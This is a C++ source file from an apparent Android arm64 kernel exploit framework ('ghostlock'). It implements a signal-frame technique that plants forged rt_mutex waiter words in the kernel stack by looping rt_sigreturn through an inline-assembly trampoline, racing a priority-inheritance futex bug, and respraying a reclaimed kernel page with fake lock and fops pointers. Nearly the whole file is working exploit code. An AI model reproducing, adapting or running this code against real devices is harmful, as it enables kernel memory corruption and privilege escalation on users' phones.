#include "route/sigreturn_route.h"

#include <cerrno>
#include <cstring>
#include <unistd.h>

using namespace ghostlock;

namespace {
    /* Magic numbers and the record header, from
     * arch/arm64/include/uapi/asm/sigcontext.h. `struct fpsimd_context` is
     * head {magic, size} + fpsr + fpcr + vregs[32] (0x200 bytes), i.e. 0x210
     * total -- the size the P1.5b run read back from a live frame. */
    constexpr uint32_t kFpsimdMagic = 0x46508001;
    constexpr uint32_t kSveMagic = 0x53564501;
    constexpr std::size_t kFpsimdRecordVregs = 0x10;
    constexpr std::size_t kFpsimdRecordBytes = 0x210;
} // namespace

namespace ghostlock::route::sigreturn {
    bool geometry_from(const profile::SigreturnLayout &layout,
                       Geometry *out) noexcept {
        if (!layout.waiter_off_sve || !layout.waiter_off_plain) return false;
        const std::uint64_t sve = *layout.waiter_off_sve;
        const std::uint64_t plain = *layout.waiter_off_plain;
        /* Zero is refused on purpose: it is both a nonsense placement (the
         * waiter never sits at the very start of the copied vregs on any 5.x
         * geometry) and the failure value patch_fpstate() must not collide
         * with. */
        if (sve == 0 || plain == 0) return false;
        if ((sve & 7U) != 0 || (plain & 7U) != 0) return false;
        if (sve > kCopyBytes - kStripBytes || plain > kCopyBytes - kStripBytes) {
            return false;
        }
        out->off_sve = static_cast<std::size_t>(sve);
        out->off_plain = static_cast<std::size_t>(plain);
        return true;
    }

    bool locate_fpstate(const void *reserved, std::size_t reserved_bytes,
                        FpState *out) noexcept {
        if (!reserved || !out) return false;
        const auto *bytes = static_cast<const unsigned char *>(reserved);
        std::size_t offset = 0;
        std::size_t fpsimd = SIZE_MAX;
        bool sve = false;
        /* The kernel terminates the record list with a zero magic (from
         * setup_sigframe's extra_context); a malformed size ends the walk
         * instead of being followed out of the buffer. */
        while (offset + 8 <= reserved_bytes) {
            uint32_t magic = 0;
            uint32_t size = 0;
            memcpy(&magic, bytes + offset, sizeof(magic));
            memcpy(&size, bytes + offset + 4, sizeof(size));
            if (magic == 0) break;
            if (size < 8 || size > reserved_bytes - offset) break;
            if (magic == kFpsimdMagic) {
                if (size < kFpsimdRecordBytes) break;
                fpsimd = offset;
            } else if (magic == kSveMagic) {
                sve = true;
            }
            offset += size;
        }
        if (fpsimd == SIZE_MAX) return false;
        out->vregs_offset = fpsimd + kFpsimdRecordVregs;
        out->sve = sve;
        return true;
    }

    bool patch_fpstate(void *reserved, std::size_t reserved_bytes,
                       const void *strip, std::size_t strip_bytes,
                       const Geometry &geometry, bool *sve_path) noexcept {
        if (!reserved || !strip || strip_bytes != kStripBytes) return false;
        FpState state{};
        if (!locate_fpstate(reserved, reserved_bytes, &state)) return false;
        const std::size_t offset = state.sve ? geometry.off_sve : geometry.off_plain;
        /* The record's vregs array is exactly kCopyBytes long, so the strip must
         * fit between the record's payload start and the copy's own extent --
         * anything else would write into the record header or past the frame. */
        if (offset + strip_bytes > kCopyBytes) return false;
        if (state.vregs_offset + offset + strip_bytes > reserved_bytes) return false;
        memcpy(static_cast<unsigned char *>(reserved) + state.vregs_offset + offset,
               strip, strip_bytes);
        if (sve_path) *sve_path = state.sve;
        return true;
    }

    SigreturnRoute::SigreturnRoute(race::PiRace *race_context,
                                   const memory::WriteRequest *route_request,
                                   const profile::TargetProfile &profile_value,
                                   profile::SigreturnLayout route_layout) noexcept
        : race(race_context),
          request(route_request),
          profile(profile_value),
          layout(route_layout) {
        status.code = ROUTE_RETRYABLE;
    }

    int32_t SigreturnRoute::fail(int32_t step, int32_t error_number) noexcept {
        status.step = step;
        status.error_number = error_number;
        return -1;
    }

    void SigreturnRoute::disarm() noexcept {
        race->consumer_go.store(0);
        if (race->consumer_inflight.load() != 0) {
            for (int32_t i = 0;
                 i < 2000 && race->consumer_inflight.load() != 0;
                 i++) {
                usleep(1000);
            }
            consumer_stuck = race->consumer_inflight.load() != 0;
        }
        status.kernel_disarmed = !consumer_stuck;
    }

    void SigreturnRoute::destroy() noexcept {
        if (consumer_stuck) {
            (void) fail(38, status.error_number);
            status.code = ROUTE_DIRTY_FAILURE;
        }
        /* Restoring the disposition is safe only because no trigger can be
         * pending here: every tgkill's delivery happens on the return path of
         * that same syscall, so the stamp loop's last iteration has already run
         * the handler and the rt_sigreturn that follows it. The mask goes back
         * first so the thread is never briefly reachable with the trigger
         * unblocked and the disposition already default (whose action for
         * SIGUSR1 is to terminate). */
        if (mask_changed) {
            (void) pthread_sigmask(SIG_SETMASK, &previous_mask, nullptr);
        }
        if (handler_installed) {
            /* Put the previous disposition back whatever it was: the route may
             * have taken over a signal another component ignores rather than
             * handles. */
            (void) sigaction(trigger_signal, &previous_action, nullptr);
            handler_installed = 0;
        }
        if (status.code != ROUTE_OK && status.kernel_disarmed &&
            status.code != ROUTE_DIRTY_FAILURE) {
            status.code = ROUTE_FALLBACK_SAFE;
        }
        status.userspace_clean = 1;
    }
} // namespace ghostlock::route::sigreturn

#if defined(__ANDROID__)
#include "common.h"

#include <ctime>
#include <ucontext.h>

#include "route/lock_anchor.h"
#include "route/route_lifecycle.hpp"
#include "support/decls.hpp"

using namespace ghostlock;

/* The two frame copies, the loop's scratch, and the trampoline that re-runs
 * them. All of it is at file scope with C linkage on purpose: the trampoline is
 * inline asm that addresses these by name, and LTO is free to rename or drop
 * anything with internal linkage (which is exactly how the first build failed
 * to link).
 *
 * A real arm64 `struct rt_sigframe` is `{ struct siginfo info; struct ucontext
 * uc; }` plus the record list inside `uc.uc_mcontext.__reserved` -- about 0x1200
 * bytes. 0x2000 leaves room, and the copies are 16-byte aligned so the records
 * inside them keep the kernel's 128-bit alignment.
 *
 * - `loop_frame`: the frame the loop keeps re-running. Its sp/pc point at itself
 *   and at the trampoline's entry, so every rt_sigreturn it performs resumes
 *   exactly there.
 * - `return_frame`: a pristine copy of the same delivered frame, kept so the
 *   deadline can end the loop by restoring the *interrupted* context. */
extern "C" {
    /* `used`: the only reader of the deadline and the counter is the inline asm
     * below, and LTO drops globals no C++ code reads. */
    [[gnu::used]] alignas(16) unsigned char ghostlock_loop_frame[0x2000];
    [[gnu::used]] alignas(16) unsigned char ghostlock_return_frame[0x2000];
    [[gnu::used]] unsigned long ghostlock_loop_deadline;
    [[gnu::used]] unsigned long ghostlock_loop_stamps;
    [[gnu::used]] unsigned long ghostlock_next_copy;
    [[gnu::used]] unsigned long ghostlock_copy_interval;

    /* The loop's entry: its first instruction is where every rt_sigreturn in the
     * loop resumes (the loop frame's pc), with sp = `ghostlock_loop_frame`. The
     * frame's own registers hold the strip, so the only thing the loop does
     * between copies is the deadline test and the stamp counter -- no syscall
     * other than rt_sigreturn itself, so nothing else ever writes the region. */
    extern "C" __attribute__((naked, noinline)) void sigreturn_loop_trampoline() noexcept {
        __asm__ volatile(
            "mov x8, #139\n"                        /* __NR_rt_sigreturn */
            /* Spin in user mode until the next copy is due, or the deadline
             * passes. The spin is what makes the stamp readable:
             * parse_user_sigframe re-zeroes the same stack depths at the top of
             * every rt_sigreturn, so in a tight loop the strip is only in place
             * for the tail of each iteration. Waiting between copies leaves the
             * region stable -- and nothing at all runs on this stack while the
             * spin runs. */
            "1:\n"
            "mrs x9, cntvct_el0\n"
            "adrp x10, ghostlock_loop_deadline\n"
            "ldr x10, [x10, #:lo12:ghostlock_loop_deadline]\n"
            "cmp x9, x10\n"
            "b.hs 2f\n"
            "adrp x10, ghostlock_next_copy\n"
            "ldr x10, [x10, #:lo12:ghostlock_next_copy]\n"
            "cmp x9, x10\n"
            "b.lo 1b\n"
            "adrp x11, ghostlock_copy_interval\n"
            "ldr x11, [x11, #:lo12:ghostlock_copy_interval]\n"
            "add x10, x10, x11\n"
            "adrp x11, ghostlock_next_copy\n"
            "str x10, [x11, #:lo12:ghostlock_next_copy]\n"
            "adrp x10, ghostlock_loop_stamps\n"
            "ldr x11, [x10, #:lo12:ghostlock_loop_stamps]\n"
            "add x11, x11, #1\n"
            "str x11, [x10, #:lo12:ghostlock_loop_stamps]\n"
            "mov x8, #139\n"
            "svc #0\n"                              /* the copy, and back to the top */
            "b 1b\n"                                /* unreachable */
            "2:\n"
            "mov x8, #139\n"
            "adrp x9, ghostlock_return_frame\n"
            "add x9, x9, #:lo12:ghostlock_return_frame\n"
            "mov sp, x9\n"
            "svc #0\n"                              /* restores the interrupted context */
            "b .\n"                                 /* unreachable */
        );
    }

} /* extern "C" */

namespace {
    constexpr std::size_t kFrameBytes = 0x2000;

    /* How many times the route re-sprays and restamps before giving the write
     * up. Matches the select route's compact ladder: a lost race clobbers the
     * reclaimed page, so every attempt rebuilds it. */
    constexpr int32_t kAttempts = 4;

    /* The consumer's per-call delay before the walk. Large enough that the stamp
     * loop is already running steadily when the walk fires. */
    constexpr uint32_t kWalkDelayUs = 5000;

    /* How long the victim re-runs rt_sigreturn before it unwinds itself -- the
     * attempt's whole window. See the trampoline above for why the loop is the
     * carrier. */
    constexpr int64_t kLoopWindowNs = 30000000;

    /* How long the loop waits in user mode between copies. Long enough that the
     * strip is stable for the overwhelming majority of the window (the kernel
     * chain between copies is ~1-3 us), short enough that a tick's clobber is
     * repaired quickly. */
    constexpr int64_t kCopyIntervalNs = 100000;

    /* Trigger candidates, first one nobody in this process already handles.
     * SIGUSR1 is the measured-good choice on this ROM; the RT signals are the
     * documented fallback space (bionic reserves the first three). SIGRTMIN is a
     * function call in this libc, so the list cannot be constexpr. */
    const int32_t kTriggerCandidates[] = {SIGUSR1, SIGRTMIN + 4, SIGRTMIN + 5};

    /* Synchronous faults stay deliverable while the window's async signals are
     * blocked: a bug in the stamp path must kill the thread, not wedge it. */
    constexpr int32_t kKeptSignals[] = {SIGSEGV, SIGBUS, SIGFPE, SIGILL, SIGABRT,
                                        SIGSYS, SIGTRAP};

    /* Handler state. One route instance exists per process (the PI race is
     * process-wide) and the handler runs on the thread that armed it, so this is
     * the route's own scratch. Every counter is touched from signal context. */
    const std::byte *g_strip = nullptr;
    std::size_t g_strip_bytes = 0;
    ghostlock::route::sigreturn::Geometry g_geometry{};
    volatile sig_atomic_t g_patched = 0;
    volatile sig_atomic_t g_misses = 0;
    volatile sig_atomic_t g_last_path_sve = -1;
    volatile sig_atomic_t g_loop_armed = 0;
    unsigned long g_cntfrq = 0;

    [[nodiscard]] unsigned long long counter_ticks() noexcept {
        unsigned long long value = 0;
        __asm__ volatile("mrs %0, cntvct_el0" : "=r"(value));
        return value;
    }

    [[nodiscard]] unsigned long long ticks_for_ns(unsigned long long ns) noexcept {
        if (!g_cntfrq) return 0;
        return (ns * g_cntfrq) / 1000000000ULL;
    }

    /* What the handler does: splice the waiter strip into the delivered frame's
     * fpsimd record, copy the frame twice, and redirect the copy the loop runs
     * on into the trampoline. No syscalls, no locks, no allocation -- this runs
     * between the signal and the rt_sigreturn that follows the handler.
     *
     * The frame base is `info`: on arm64 the kernel hands an SA_SIGINFO handler
     * `x1 = &frame->info`, `x2 = &frame->uc`, and `struct rt_sigframe` starts
     * with `info`, so the two pointers also give the offset of `uc` inside the
     * frame without this file having to know the kernel's struct layout. */
    extern "C" void sigreturn_route_handler(int, siginfo_t *info, void *context) noexcept {
        /* Plain assignments, not ++: the volatile increment is deprecated in
         * C++20 and this file builds with the project's zero-warning policy. */
        if (!context || !info || !g_strip) {
            g_misses = g_misses + 1;
            return;
        }
        auto *uc = static_cast<ucontext_t *>(context);
        const std::ptrdiff_t uc_offset =
            reinterpret_cast<const char *>(context) - reinterpret_cast<const char *>(info);
        bool sve = false;
        if (!ghostlock::route::sigreturn::patch_fpstate(
                uc->uc_mcontext.__reserved, sizeof(uc->uc_mcontext.__reserved),
                g_strip, g_strip_bytes, g_geometry, &sve)) {
            g_misses = g_misses + 1;
            return;
        }
        g_last_path_sve = sve ? 1 : 0;
        g_patched = g_patched + 1;

        if (g_loop_armed == 0) return;

        /* Copy the frame twice: the pristine one is the way out, the other one
         * is what the loop keeps re-running. */
        const auto *frame = reinterpret_cast<const unsigned char *>(info);
        memcpy(ghostlock_return_frame, frame, kFrameBytes);
        memcpy(ghostlock_loop_frame, frame, kFrameBytes);
        auto *loop_uc = reinterpret_cast<ucontext_t *>(ghostlock_loop_frame + uc_offset);
        auto *return_uc = reinterpret_cast<ucontext_t *>(ghostlock_return_frame + uc_offset);
        /* The copies carry the delivered frame verbatim, so they need the strip
         * too -- the copy the loop runs on is the one whose vregs the kernel
         * will read, every iteration. */
        bool copy_sve = false;
        (void) ghostlock::route::sigreturn::patch_fpstate(
            loop_uc->uc_mcontext.__reserved, sizeof(loop_uc->uc_mcontext.__reserved),
            g_strip, g_strip_bytes, g_geometry, &copy_sve);
        (void) ghostlock::route::sigreturn::patch_fpstate(
            return_uc->uc_mcontext.__reserved, sizeof(return_uc->uc_mcontext.__reserved),
            g_strip, g_strip_bytes, g_geometry, &copy_sve);
        /* Loop frame: sp points at itself, pc at the trampoline's entry. Every
         * rt_sigreturn inside the loop resumes there. */
        loop_uc->uc_mcontext.sp = reinterpret_cast<std::uint64_t>(ghostlock_loop_frame);
        loop_uc->uc_mcontext.pc =
            reinterpret_cast<std::uint64_t>(&sigreturn_loop_trampoline);
        /* And the frame the kernel is about to restore when this handler
         * returns: the same redirection, so the thread never resumes in user
         * code between entering and leaving the loop. */
        uc->uc_mcontext.sp = reinterpret_cast<std::uint64_t>(ghostlock_loop_frame);
        uc->uc_mcontext.pc = reinterpret_cast<std::uint64_t>(&sigreturn_loop_trampoline);
    }

    /* Integer microseconds between two monotonic samples. The route must not
     * touch floating point after the first stamp: rt_sigreturn loads the strip
     * into every FP/SIMD register, so any live value the compiler kept in
     * d8-d15 is garbage from there on. */
    int64_t elapsed_us(const timespec &start, const timespec &now) noexcept {
        return (static_cast<int64_t>(now.tv_sec) - static_cast<int64_t>(start.tv_sec)) * 1000000 +
               (static_cast<int64_t>(now.tv_nsec) - static_cast<int64_t>(start.tv_nsec)) / 1000;
    }

    int64_t now_us_since(const timespec &start) noexcept {
        timespec now{};
        (void) clock_gettime(CLOCK_MONOTONIC, &now);
        return elapsed_us(start, now);
    }
} // namespace

namespace ghostlock::route::sigreturn {
    bool SigreturnRoute::install_trigger() noexcept {
        struct sigaction action{};
        action.sa_sigaction = sigreturn_route_handler;
        action.sa_flags = SA_SIGINFO;
        sigemptyset(&action.sa_mask);
        for (const int32_t candidate : kTriggerCandidates) {
            struct sigaction current{};
            if (sigaction(candidate, nullptr, &current) != 0) continue;
            if (current.sa_handler != SIG_DFL) continue;
            if (sigaction(candidate, &action, &previous_action) != 0) continue;
            trigger_signal = candidate;
            handler_installed = 1;
            break;
        }
        if (!handler_installed) {
            pr_error("[route] sigreturn: every trigger candidate is already handled by this "
                     "process; refusing to take over another component's handler\n");
            return false;
        }
        /* Block the process's other asynchronous signals for the window. A
         * signal delivered to the victim would run its own handler and then its
         * own rt_sigreturn -- another fpsimd copy over the same kernel stack
         * region. Blocking the trigger would instead leave every tgkill
         * pending, so it is explicitly unblocked on this thread. */
        sigset_t block{};
        sigfillset(&block);
        for (const int32_t kept : kKeptSignals) sigdelset(&block, kept);
        sigdelset(&block, trigger_signal);
        if (pthread_sigmask(SIG_BLOCK, &block, &previous_mask) != 0) {
            pr_warning("[route] sigreturn: cannot block the window's signals (errno=%d); "
                       "continuing with whatever disposition the process has\n", errno);
        } else {
            mask_changed = 1;
        }
        sigset_t unblock{};
        sigemptyset(&unblock);
        sigaddset(&unblock, trigger_signal);
        (void) pthread_sigmask(SIG_UNBLOCK, &unblock, nullptr);
        trigger_tid = static_cast<int32_t>(syscall(__NR_gettid));
        trigger_pid = getpid();
        /* The loop's deadline is in counter ticks; read the frequency once. */
        unsigned long long frequency = 0;
        __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(frequency));
        g_cntfrq = static_cast<unsigned long>(frequency);
        pr_info("[route] sigreturn trigger: signal=%d tid=%d cntfrq=%lu (SIGUSR1 preferred, RT "
                "fallbacks; the previous disposition is restored at destroy)\n",
                trigger_signal, trigger_tid, g_cntfrq);
        return true;
    }

    bool SigreturnRoute::build_stamp(int32_t attempt) noexcept {
        uintptr_t lock = session::g_exploit_session.heap.current.fake_lock;
        if (layout.lock_anchor_image) {
            /* Same grid, same boot-scoped serial as the select route: the anchor
             * region is shared kernel state. 0 means "fail the route", never
             * "walk a neighbour". */
            uintptr_t slot = 0;
            const uintptr_t anchored = anchor::acquire_lock_word(
                *layout.lock_anchor_image, layout.lock_anchor_bytes,
                layout.lock_anchor_stride, attempt, &slot);
            if (anchored == 0) return false;
            lock = anchored;
        }
        /* The eleven words are the select route's compact stamp -- reference:
         * its `pselect_waiter_word words[]` table. waiter_words() is the shared
         * definition; payload_builder_test pins both against fixed vectors. */
        const memory::PayloadWriteLayout stamp_layout = {
            .parent = (session::g_exploit_session.heap.current.fake_parent),
            .right = (session::g_exploit_session.heap.current.fake_right),
            .left = (session::g_exploit_session.heap.current.fake_left),
        };
        const memory::WaiterTreeStamp stamp = memory::waiter_tree_stamp(stamp_layout);
        pr_info("[route] tree stamp pc=0x%llx right=0x%llx left=0x%llx target=0x%llx\n",
                static_cast<unsigned long long>(stamp.pc),
                static_cast<unsigned long long>(stamp.right),
                static_cast<unsigned long long>(stamp.left),
                static_cast<unsigned long long>(request->target));
        const memory::WaiterWords words = memory::waiter_words(
            stamp_layout, (session::g_exploit_session.heap.current.fake_task), lock,
            static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO));
        if (!memory::encode_waiter_words(strip, 0, words)) {
            pr_warning("sigreturn stamp does not fit its window (%zu bytes)\n", strip.size());
            return false;
        }
        lock_word = lock;
        g_strip = strip.data();
        g_strip_bytes = strip.size();
        g_geometry = geometry;
        return true;
    }

    int32_t SigreturnRoute::prepare() noexcept {
        if (!(session::g_exploit_session.heap.current.base) ||
            !(session::g_exploit_session.heap.current.fake_lock) ||
            !(session::g_exploit_session.heap.current.fake_fops)) {
            pr_warning("sigreturn route missing kernel page base=%016zx lock=%016zx "
                       "fops=%016zx\n", (session::g_exploit_session.heap.current.base),
                       (session::g_exploit_session.heap.current.fake_lock),
                       (session::g_exploit_session.heap.current.fake_fops));
            return fail(30, 0);
        }
        if (!geometry_from(layout, &geometry)) {
            pr_error("[route] sigreturn geometry unusable (off_sve=0x%llx off_plain=0x%llx): "
                     "both offsets must be present, 8-aligned, non-zero, and leave room for "
                     "the 0x%zx-byte waiter strip inside the 0x%zx-byte copy window -- this "
                     "profile's kernel has no measured sigreturn geometry\n",
                     static_cast<unsigned long long>(layout.waiter_off_sve.value_or(0)),
                     static_cast<unsigned long long>(layout.waiter_off_plain.value_or(0)),
                     kStripBytes, kCopyBytes);
            return fail(36, EINVAL);
        }
        if (!install_trigger()) return fail(37, EINVAL);
        if (!build_stamp(1)) return fail(34, ENOSPC);
        return 0;
    }

    void SigreturnRoute::stamp_window(const timespec &started) noexcept {
        /* Enter the loop with one signal, and return from it when the loop's own
         * deadline fires (the trampoline restores the interrupted context, so
         * this function resumes exactly here).
         *
         * The consumer's walk is the only thing that can fire during the loop;
         * the strip is in place the entire time because the loop's only writer
         * of the region is the copy being re-run. A tick taken from EL0 inside
         * the loop is the one remaining clobberer -- it nests from depth 0 and
         * measured 0x290 at __switch_to -- but the next iteration's copy repairs
         * that within a microsecond. */
        (void) started;
        ghostlock_loop_stamps = 0;
        ghostlock_copy_interval = ticks_for_ns(kCopyIntervalNs);
        ghostlock_next_copy = counter_ticks();          /* first copy immediately */
        ghostlock_loop_deadline = counter_ticks() + ticks_for_ns(kLoopWindowNs);
        g_loop_armed = 1;
        (void) syscall(__NR_tgkill, trigger_pid, trigger_tid, trigger_signal);
        /* Reached only through the return frame. */
    }

    route::RouteStatus SigreturnRoute::execute() noexcept {
        struct timespec route_t0{};
        clock_gettime(CLOCK_MONOTONIC, &route_t0);
        int32_t calls_total = 0;
        int32_t successes_total = 0;

        for (int32_t attempt = 1; attempt <= kAttempts; attempt++) {
            if (attempt > 1) {
                /* A lost race clobbers the reclaimed page, so every retry
                 * resprays and re-derives fake_* before the strip is rebuilt
                 * (and before a new anchor slot is drawn). */
                const uintptr_t rebuilt = support::prepare_good_kernel_page(*request);
                if (!rebuilt || !(session::g_exploit_session.heap.current.fake_lock) ||
                    !(session::g_exploit_session.heap.current.fake_fops)) {
                    pr_warning("sigreturn retry page prepare failed attempt=%d\n", attempt);
                    (void) fail(35, errno);
                    break;
                }
                if (!build_stamp(attempt)) {
                    (void) fail(34, ENOSPC);
                    break;
                }
            }

            race->consumer_calls.store(0);
            race->consumer_success.store(0);
            race->consumer_stop.store(0);
            race->route_delay_usec.store(kWalkDelayUs);
            race->consumer_go.store(attempt);

            const int32_t patched_before = g_patched;
            pr_info("sigreturn pre-stamp attempt=%d/%d off_sve=0x%zx off_plain=0x%zx "
                    "lock=0x%llx +%lldms\n",
                    attempt, kAttempts, geometry.off_sve, geometry.off_plain,
                    static_cast<unsigned long long>(lock_word),
                    static_cast<long long>(now_us_since(route_t0) / 1000));
            stamp_window(route_t0);
            pr_info("sigreturn post-stamp attempt=%d/%d stamps=%d misses=%d path_sve=%d "
                    "+%lldms\n",
                    attempt, kAttempts, g_patched - patched_before, g_misses,
                    g_last_path_sve,
                    static_cast<long long>(now_us_since(route_t0) / 1000));
            race->consumer_go.store(0);

            const int32_t calls = race->consumer_calls.load();
            const int32_t successes = race->consumer_success.load();
            calls_total += calls;
            successes_total += successes;
            if (calls > 0 && successes > 0) {
                status.code = ROUTE_OK;
                status.step = 0;
                status.error_number = 0;
                break;
            }
            (void) fail(33, 0);
        }
        stamps = g_patched;
        stamp_misses = g_misses;
        consumer_calls = calls_total;
        consumer_successes = successes_total;
        return status;
    }
} // namespace ghostlock::route::sigreturn

namespace ghostlock::route {
    /* The policy entry, same shape as the select route's: one instance, the
     * validated lifecycle order, one summary line with everything the host can
     * correlate against the consumer's counters. */
    RouteStatus do_sigreturn_fake_lock_route(const memory::WriteRequest *request) {
        sigreturn::SigreturnRoute context(
            &session::g_exploit_session.race, request, session::g_exploit_session.profile,
            session::g_exploit_session.profile.sigreturn_layout());
        const RouteStatus status = run_route_lifecycle(context);

        pr_info("sigreturn route done calls=%d success=%d status=%d clean=%d/%d "
                "step=%d errno=%d stamps=%d misses=%d lock=0x%llx\n",
                context.consumer_calls, context.consumer_successes,
                context.status.code, context.status.userspace_clean,
                context.status.kernel_disarmed, context.status.step,
                context.status.error_number, context.stamps, context.stamp_misses,
                static_cast<unsigned long long>(context.lock_word));
        return status;
    }
} // namespace ghostlock::route
#endif // __ANDROID__
